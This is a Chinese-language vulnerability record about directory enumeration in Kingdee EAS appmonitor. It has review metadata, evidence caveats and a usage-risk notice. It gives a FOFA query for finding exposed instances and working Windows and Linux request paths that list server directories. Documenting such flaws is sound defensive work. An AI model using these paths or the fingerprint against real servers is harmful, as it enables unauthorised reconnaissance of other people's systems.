---
source: "MrWQ/vulnerability-paper"
title: "金蝶EAS appmonitor server_file目录枚举"
product: "金蝶EAS appmonitor"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "Windows/Linux目录；版本未知"
prerequisites: "protected路径鉴权未说明"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://mp.weixin.qq.com/s/M9wZwqLGafQZCZcIYcIEeA"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/ERP%E4%BC%81%E4%B8%9A/%E9%87%91%E8%9D%B6/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%9A%20%E9%87%91%E8%9D%B6%20OA%20server%20file%20%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E.md"
id: "vw-2171aeefc28b7366bce8e17c"
entity_id: "ve-2171aeefc28b7366bce8e17c"
schema_version: "1"
---

# 金蝶EAS appmonitor server_file目录枚举

## 条目说明

- 对象与具体问题：金蝶EAS appmonitor；server_file目录枚举
- 版本、配置及部署条件：Windows/Linux目录；版本未知
- 认证与权限前提：protected路径鉴权未说明
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 目录files列举不等同文件内容读取/遍历越界，应定义目录枚举能力
- 只有相对URL、图无请求/文本结果/修复
- OA泛称与EAS资产指纹需统一产品分类，去关注装饰

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/M9wZwqLGafQZCZcIYcIEeA)

  

  

点击蓝字 / 关注我们

  

01

漏洞影响

金蝶 OA  

02

FOFA 语法

app="Kingdee-EAS"

03

相关 POC

Windows  

----------

appmonitor/protected/selector/server_file/files?folder=C://&suffix=

Linux
-----

appmonitor/protected/selector/server_file/files?folder=/&suffix=

04

具体例子

![](https://mmbiz.qpic.cn/mmbiz_png/tF1M75DDm9QcJ2kg6C1lQYxgpciaNPcyT9Wvia7OXB7PIygkhIDhodmCALRdSGR9jSKNdXZ7OwAH2uNvs6ktpEmA/640?wx_fmt=png)  

![](https://mmbiz.qpic.cn/mmbiz_png/tF1M75DDm9QcJ2kg6C1lQYxgpciaNPcyTcUJRhTu4TXCb3bHsCFExWesXyplanfRjUnrWmt9vL09fjQHOiaXkSBA/640?wx_fmt=png)

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
